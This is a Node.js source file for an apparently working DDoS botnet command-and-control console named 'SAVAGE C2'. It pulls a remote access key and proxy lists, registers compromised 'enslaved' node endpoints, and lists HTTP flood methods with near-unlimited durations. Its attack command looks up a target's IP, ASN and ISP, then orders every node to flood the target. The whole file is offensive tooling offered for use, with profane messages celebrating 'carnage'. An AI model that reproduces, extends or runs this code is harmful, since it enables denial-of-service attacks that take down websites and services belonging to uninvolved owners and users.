#!/usr/bin/env node
const { exec, spawn } = require('child_process');
const readline = require('readline');
const url = require('url');
const fs = require('fs');
const axios = require('axios');
const path = require('path');

const version = 'v2-SAVAGE'; // Version bump for Savage God integration.
let processList = [];

// --- Configuration ---
const LIB_DIR = path.join(__dirname, 'lib');
const BOTNET_FILE_PATH = path.join(LIB_DIR, 'botnet.json');
const METHODS_FILE_PATH = path.join(LIB_DIR, 'methods.json');
const PROXY_FILE_PATH = path.join(__dirname, 'proxy.txt');
const UA_FILE_PATH = path.join(__dirname, 'ua.txt');

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// --- Utility Functions ---

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function ensureLibDirExists() {
  if (!fs.existsSync(LIB_DIR)) {
    fs.mkdirSync(LIB_DIR, { recursive: true });
  }
}

// MODIFIED: This function now forges the methods file with the SAVAGE GOD's scripture.
function ensureMethodsFileExists() {
  if (!fs.existsSync(METHODS_FILE_PATH)) {
    console.log(`\x1b[1m[ \x1b[32mSAVAGE C2\x1b[0m \x1b[1m]\x1b[0m Transcribing the savage scripture into methods.json...`);
    const savageMethods = [
      {
        "name": "HTTP-SICARIO",
        "description": "Composite high-request HTTP flood.",
        "duration": "999999999"
      },
      {
        "name": "RAW-HTTP",
        "description": "Raw HTTP/2 and panel-focused flood.",
        "duration": "999999999"
      },
      {
        "name": "R9",
        "description": "High dstat, hold, and bypass composite method.",
        "duration": "999999999"
      },
      {
        "name": "PRIV-TOR",
        "description": "High-volume flood utilizing various vectors.",
        "duration": "999999999"
      },
      {
        "name": "HOLD-PANEL",
        "description": "Direct HTTP panel attack.",
        "duration": "999999999"
      },
      {
        "name": "R1",
        "description": "The ultimate fucking swarm. All vectors, maximum chaos.",
        "duration": "999999999"
      }
    ];
    fs.writeFileSync(METHODS_FILE_PATH, JSON.stringify(savageMethods, null, 2));
  }
}

function handleNetworkError(error, context) {
    console.error(`\x1b[31m[ERROR]\x1b[0m ${context}`);
    if (error.code === 'ENOTFOUND' || error.code === 'ECONNRESET') {
        console.error('\x1b[31m->\x1b[0m Failed to resolve hostname. Your internet connection is shit.');
    } else if (error.response) {
        console.error(`\x1b[31m->\x1b[0m Server responded with status: ${error.response.status}`);
    } else {
        console.error(`\x1b[31m->\x1b[0m Message: ${error.message}`);
    }
}

// --- Core Functions ---

async function banner() {
  console.clear();
  
  console.log(`\x1b[31mSAVAGE C2\x1b[0m ] The Will of the Savage God, Manifested.
Type \x1b[1m\x1b[32mhelp\x1b[0m to see your commands.
\x1b[34m______________________________________________________________________________\x1b[0m
`);
}

async function fetchResource(url, filePath, resourceName) {
    console.log(`\x1b[1m[ \x1b[32mSAVAGE C2\x1b[0m \x1b[1m]\x1b[0m Scavenging for latest ${resourceName}...`);
    try {
        const response = await axios.get(url, { timeout: 15000 });
        fs.writeFileSync(filePath, response.data, 'utf-8');
        console.log(`\x1b[1m[ \x1b[32mSAVAGE C2\x1b[0m \x1b[1m]\x1b[0m Successfully updated ${resourceName}.`);
        return true;
    } catch (error) {
        handleNetworkError(error, `Failed to fetch ${resourceName}.`);
        if (fs.existsSync(filePath)) {
            console.log(`\x1b[33m[WARNING]\x1b[0m Using cached version of ${resourceName}. It's probably stale.`);
            return true;
        }
        return false;
    }
}

async function bootup() {
    console.clear();
    console.log(`\x1b[1m[ \x1b[32mSAVAGE C2\x1b[0m \x1b[1m]\x1b[0m Awakening...`);
    ensureLibDirExists();
    ensureMethodsFileExists(); // This will create the methods file with the Savage God methods.

    const proxySuccess = await fetchResource('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt', PROXY_FILE_PATH, 'Proxy List');
    const uaSuccess = await fetchResource('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt', UA_FILE_PATH, 'User Agents');
    
    if (!proxySuccess || !uaSuccess) {
        console.error('\x1b[31m[FATAL]\x1b[0m Could not download essential files. Fix your shit and restart. Exiting.');
        process.exit(1);
    }
    
    try {
        const secretResponse = await axios.get('https://raw.githubusercontent.com/D4youXTool/cache/main/sigma.txt');
        const password = secretResponse.data.trim();

        permen.question('\x1b[1m\x1b[36mEnter Access Key: \x1b[0m', async (inputKey) => {
            if (inputKey.trim() === password) {
                console.clear();
                console.log(`\x1b[32mAuthentication Accepted. Welcome, Overlord.\x1b[0m`);
                await sleep(1000);
                await banner();
                sigma();
            } else {
                console.log(`\x1b[31mWrong Key. You are not worthy. Get the fuck out.\x1b[0m`);
                process.exit(1);
            }
        });
    } catch (error) {
        handleNetworkError(error, 'Could not verify access key');
        console.error('\x1b[31m[FATAL]\x1b[0m Can you even connect to the internet? Auth server is unreachable. Exiting.');
        process.exit(1);
    }
}

// --- Command Functions ---

function showMethods() {
    try {
        const methodsData = JSON.parse(fs.readFileSync(METHODS_FILE_PATH, 'utf-8'));
        console.log(`\n\x1b[0m NAME           │ DESCRIPTION                              │ DURATION`);
        console.log(`\x1b[0m────────────────┼──────────────────────────────────────────┼──────────`);
        methodsData.forEach(method => {
            console.log(
                `\x1b[31m${method.name.padEnd(14)}\x1b[0m │ ${method.description.padEnd(40)} │ ${method.duration.padEnd(9)}`
            );
        });
    } catch (err) {
        console.error('\x1b[31m[ERROR]\x1b[0m Could not read `lib/methods.json`. Your shit is broken.');
    }
}

async function addsrv(args) {
    if (args.length < 1) {
        console.log(`\x1b[33mUsage:\x1b[0m addsrv <endpoint_url>`);
        console.log(`\x1b[36mExample:\x1b[0m addsrv http://1.2.3.4:5000/Sutrator`);
        return;
    }
    const endpoint = args[0];

    try {
        new url.URL(endpoint);
    } catch (error) {
        console.error(`\x1b[31m[ERROR]\x1b[0m That's not a fucking URL: ${endpoint}`);
        return;
    }

    let botnetData = { endpoints: [] };
    try {
        if (fs.existsSync(BOTNET_FILE_PATH)) {
            botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
        }
    } catch (e) {
        console.error(`\x1b[31m[ERROR]\x1b[0m Failed to read or parse botnet file. Creating a new one for you.`);
    }

    if (botnetData.endpoints.includes(endpoint)) {
        console.log(`\x1b[33m[INFO]\x1b[0m Endpoint ${endpoint} is already in there, dumbass.`);
    } else {
        botnetData.endpoints.push(endpoint);
        fs.writeFileSync(BOTNET_FILE_PATH, JSON.stringify(botnetData, null, 2));
        console.log(`\x1b[32m[SUCCESS]\x1b[0m Endpoint ${endpoint} enslaved.`);
    }
}

async function checkVps() {
    let botnetData;
    try {
        botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
    } catch (error) {
        console.error('\x1b[31m[ERROR]\x1b[0m Botnet file not found. Enslave some servers with \`addsrv\` first.');
        return;
    }

    if (!botnetData.endpoints || botnetData.endpoints.length === 0) {
        console.log('\x1b[33m[INFO]\x1b[0m The swarm is empty. It craves nodes.');
        return;
    }

    console.log(`\x1b[1m[SAVAGE C2]\x1b[0m Pinging ${botnetData.endpoints.length} node(s)...`);
    const timeout = 10000;
    const validEndpoints = [];

    const requests = botnetData.endpoints.map(async (endpoint) => {
        try {
            // The Savage God nodes respond to a test ping on their main endpoint
            await axios.get(endpoint, { timeout, params: { target: 'https://google.com', time: 1, methods: 'test' } });
            console.log(`\x1b[32m[ONLINE]\x1b[0m - ${endpoint}`);
            validEndpoints.push(endpoint);
        } catch (error) {
            console.log(`\x1b[31m[OFFLINE]\x1b[0m - ${endpoint}`);
        }
    });

    await Promise.all(requests);

    botnetData.endpoints = validEndpoints;
    fs.writeFileSync(BOTNET_FILE_PATH, JSON.stringify(botnetData, null, 2));
    console.log(`\x1b[1m[SAVAGE C2]\x1b[0m Check complete. ${validEndpoints.length} node(s) are online and awaiting command.`);
}

async function launchAttack(args) {
    if (args.length < 3) {
        console.log(`\x1b[33mUsage:\x1b[0m attack <target> <duration> <method>`);
        console.log(`\x1b[36mExample:\x1b[0m attack http://example.com 120 HTTP-SICARIO`);
        console.log(`\x1b[33mNote:\x1b[0m Rate and threads are hardcoded in the Savage God methods. They will be ignored.`);
        return;
    }
    const [target, duration, method] = args;

    let targetInfo;
    try {
        const parsedUrl = new url.URL(target);
        const hostname = parsedUrl.hostname;
        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=status,message,country,as,isp,org,query`);
        if (response.data.status !== 'success') {
            throw new Error(response.data.message || 'Failed to fetch IP info');
        }
        targetInfo = response.data;
    } catch (error) {
        handleNetworkError(error, `Could not resolve target information for ${target}`);
        return;
    }

    let botnetData;
    try {
        botnetData = JSON.parse(fs.readFileSync(BOTNET_FILE_PATH, 'utf8'));
        if (!botnetData.endpoints || botnetData.endpoints.length === 0) {
            console.error('\x1b[31m[ERROR]\x1b[0m No nodes in the swarm. Use `addsrv`, you idiot.');
            return;
        }
    } catch (error) {
        console.error('\x1b[31m[ERROR]\x1b[0m Botnet file is fucked. Use `addsrv` to add nodes.');
        return;
    }
    
    console.log(`   \x1b[1;37mAttack Order\x1b[0m
       \x1b[1;37mStatus:    [\x1b[0m \x1b[1;36mUnleashing the swarm (${botnetData.endpoints.length} nodes)\x1b[0m \x1b[1;37m]\x1b[0m
       \x1b[1;37mHost:      [\x1b[0m \x1b[1;36m\x1b[38;2;252;125;5m${target}\x1b[0m \x1b[1;37m]\x1b[0m
       \x1b[1;37mTime:      [\x1b[0m \x1b[1;36m\x1b[38;2;252;125;5m${duration} seconds\x1b[0m \x1b[1;37m]\x1b[0m
       \x1b[1;37mMethod:    [\x1b[0m \x1b[1;36m\x1b[38;2;252;125;5m${method.toUpperCase()}\x1b[0m \x1b[1;37m]\x1b[0m
   \x1b[1;37mTarget Details\x1b[0m
       \x1b[1;37mIP:        [\x1b[0m \x1b[1;36m\x1b[38;2;252;125;5m${targetInfo.query}\x1b[0m \x1b[1;37m]\x1b[0m
       \x1b[1;37mASN:       [\x1b[0m \x1b[1;36m\x1b[38;2;252;125;5m${targetInfo.as}\x1b[0m \x1b[1;37m]\x1b[0m
       \x1b[1;37mISP:       [\x1b[0m \x1b[1;36m\x1b[38;2;252;125;5m${targetInfo.isp}\x1b[0m \x1b[1;37m]\x1b[0m
       \x1b[1;37mCountry:   [\x1b[0m \x1b[1;36m\x1b[38;2;252;125;5m${targetInfo.country}\x1b[0m \x1b[1;37m]\x1b[0m`);

    let successCount = 0;
    const requests = botnetData.endpoints.map(async (endpoint) => {
        // The Savage God nodes expect 'target', 'time', and 'methods' query parameters.
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${method.toUpperCase()}`;
        try {
            await axios.get(apiUrl, { timeout: 15000 });
            successCount++;
        } catch (error) {
             // A single demon failing its task is irrelevant to the swarm. No need to log it.
        }
    });

    await Promise.all(requests);
    console.log(`\n\x1b[32m[SUCCESS]\x1b[0m The Savage God's will was sent to ${successCount}/${botnetData.endpoints.length} online nodes. Let the carnage begin.`);
}

// --- Main Command Loop ---

async function sigma() {
    permen.question('\x1b[1m\x1b[31mSAVAGE C2\x1b[0m\x1b[1m > \x1b[0m', (input) => {
        const [command, ...args] = input.trim().split(/\s+/);
        const action = command ? command.toLowerCase() : '';

        const commands = {
            'help': () => {
                console.log(`
\x1b[0mNAME         │ DESCRIPTION
─────────────┼──────────────────────────────────────────────────
 methods     │ Show list of available savage attack methods
 addsrv      │ <url> - Enslave a new Savage God node
 listsrv     │ Check status of all enslaved nodes
 attack      │ <target> <time> <method> - Unleash the swarm
 clear       │ (cls, c) - Clear your pathetic screen
 exit        │ (quit) - Terminate this session
`);
                sigma();
            },
            'methods': () => { showMethods(); sigma(); },
            'addsrv': () => { addsrv(args).then(sigma); },
            'listsrv': () => { checkVps().then(sigma); },
            'attack': () => { launchAttack(args).then(sigma); },
            'clear': () => { banner().then(sigma); },
            'cls': () => { banner().then(sigma); },
            'c': () => { banner().then(sigma); },
            'exit': () => { console.log('\x1b[0mGo cause some fucking chaos.\x1b[0m'); process.exit(0); },
            'quit': () => { console.log('\x1b[0mGo cause some fucking chaos.\x1b[0m'); process.exit(0); }
        };

        if (commands[action]) {
            commands[action]();
        } else if (action) {
            console.log(`\x1b[31mUnknown command: "${action}". Type "help", you fucking moron.\x1b[0m`);
            sigma();
        } else {
            sigma();
        }
    });
}

// --- Cleanup and Startup ---

function cleanup() {
    if (fs.existsSync(PROXY_FILE_PATH)) fs.unlinkSync(PROXY_FILE_PATH);
    if (fs.existsSync(UA_FILE_PATH)) fs.unlinkSync(UA_FILE_PATH);
    console.log('\nCleaning up the mess. Exiting.');
}

process.on('exit', cleanup);
process.on('SIGINT', () => process.exit());
process.on('SIGTERM', () => process.exit());

bootup();